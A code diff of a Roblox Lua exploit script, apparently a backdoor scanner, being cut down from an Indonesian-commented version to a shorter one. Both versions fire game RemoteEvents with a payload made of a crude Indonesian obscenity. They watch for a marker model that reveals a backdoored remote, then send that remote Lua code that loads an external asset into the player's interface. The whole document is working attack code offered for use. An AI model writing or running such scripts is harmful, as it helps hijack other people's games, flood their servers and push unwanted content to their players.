@@ -1,86 +1,58 @@
-local namaModel = "sptzyy"  -- Nama model yang dicari
-local remoteTerakhir = nil   -- Menyimpan remote terakhir yang di-fire
-local modelDitemukan = nil   -- Menyimpan model sptzyy yang ditemukan
+local modelName = "sptzyy"
+local zyy = nil
+local lastFired = nil
 
 -- Bersihkan model lama di Workspace
 for _, obj in ipairs(workspace:GetChildren()) do
-    if obj.Name == namaModel then
+    if obj.Name == modelName then
         obj:Destroy()
-        print("Model lama dihapus: " .. namaModel)
     end
 end
 
 -- Deteksi model baru yang muncul
 workspace.ChildAdded:Connect(function(child)
-    if child.Name == namaModel and modelDitemukan == nil then
-        modelDitemukan = remoteTerakhir
-        print("Model " .. namaModel .. " ditemukan!")
+    if child.Name == modelName and zyy == nil then
+        zyy = lastFired
+        print("Found zyy!")
     end
 end)
 
-local payloadAwal = [[
+local payload = [[
  KONTOL MESUM😂
-]]  -- Payload untuk spam semua remote
+]]
 
-print("Memulai eksekusi semua remote secara otomatis...")
-
--- Eksekusi OTOMATIS SEMUA REMOTE di seluruh game
-for _, remote in ipairs(game:GetDescendants()) do
-    pcall(function()
-        if remote:IsA("RemoteEvent") then
-            remote:FireServer(payloadAwal)
-            remoteTerakhir = remote
-            print("RemoteEvent di-fire: " .. remote:GetFullName())
-        elseif remote:IsA("RemoteFunction") then
-            pcall(remote.InvokeServer, remote, payloadAwal)
-            remoteTerakhir = remote
-            print("RemoteFunction di-invoke: " .. remote:GetFullName())
-        end
-    end)
-    game:GetService("RunService").RenderStepped:Wait()  -- Delay kecil antar remote
-end
-
-print("Selesai menjalankan semua remote. Menunggu model...")
-
-task.wait(0.5)  -- Tunggu sebentar
-
--- Eksekusi payload insert jika model ditemukan
-if modelDitemukan and typeof(modelDitemukan) == "Instance" then
-    local namaPemain = game.Players.LocalPlayer.Name
-    local payloadInsert = [[
-local player = game.Players:FindFirstChild("]] .. namaPemain .. [[")
-if player and player:FindFirstChild("PlayerGui") then
-    local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
-    asset.Parent = player.PlayerGui
-    for _, child in ipairs(asset:GetChildren()) do
-        child.Parent = player.PlayerGui
+-- Eksekusi semua RemoteEvent di ReplicatedStorage
+for _, remote in ipairs(game.ReplicatedStorage:GetDescendants()) do
+    if remote:IsA("RemoteEvent") then
+        pcall(function()
+            remote:FireServer(payload)
+        end)
+        lastFired = remote
+        game:GetService("RunService").RenderStepped:Wait()
     end
-    asset:Destroy()
-    print("Asset berhasil diinsert ke " .. player.Name)
 end
-    ]]
-    
-    pcall(function()
-        if modelDitemukan:IsA("RemoteEvent") then
-            modelDitemukan:FireServer(payloadInsert)
-        elseif modelDitemukan:IsA("RemoteFunction") then
-            modelDitemukan:InvokeServer(payloadInsert)
+
+task.wait(0.5)
+
+if zyy and typeof(zyy) == "Instance" then
+    local playerName = game.Players.LocalPlayer.Name
+    local insertPayload = [[
+        local player = game.Players:FindFirstChild("]] .. playerName .. [[")
+        if player and player:FindFirstChild("PlayerGui") then
+            local asset = game:GetService("InsertService"):LoadAsset(73729830375562)
+            asset.Parent = player.PlayerGui
+            for _, child in ipairs(asset:GetChildren()) do
+                child.Parent = player.PlayerGui
+            end
+            asset:Destroy()
         end
-    end)
-    
-    game:GetService("StarterGui"):SetCore("SendNotification", {
-        Title = "sptzyy",
-        Text = "Berhasil! Asset diinsert otomatis.",
-        Icon = "",
-        Duration = 5,
-    })
+    ]]
+    zyy:FireServer(insertPayload)
 else
     game:GetService("StarterGui"):SetCore("SendNotification", {
         Title = "sptzyy",
-        Text = "Model tidak ditemukan :(",
+        Text = ":(",
         Icon = "",
         Duration = 5,
     })
 end
-
-print("Skrip selesai dieksekusi.")
